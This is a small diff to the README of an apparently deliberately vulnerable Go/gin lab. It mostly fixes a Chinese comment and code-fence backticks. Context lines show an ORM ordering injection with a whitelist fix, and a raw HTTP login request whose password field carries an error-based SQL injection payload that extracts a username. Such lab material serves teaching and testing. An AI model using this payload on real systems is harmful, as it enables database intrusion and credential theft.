@@ -10,7 +10,7 @@ An example of gin contains many useful vul
 ````
 db.Order(xxxx).First(&user)
 
-// 对于列名
+// 对于列名的修复
 validCols := map[string]bool{"col1": true, "col2":true}
 
 if _, ok := validCols[xxxx]; !ok {
@@ -21,7 +21,7 @@ db.Order(xxxx)
 ````
 
 
-``
+````
 POST /sql/login HTTP/1.1
 Host: 127.0.0.1:8000
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:103.0) Gecko/20100101 Firefox/103.0
@@ -38,4 +38,4 @@ Content-Type: application/x-www-form-urlencoded
 Content-Length: 106
 
 user=user&password=123456 AND EXTRACTVALUE(9509,CONCAT(0x5c,(SELECT user from blog.blog_login LIMIT 0,1)))
-``
+```
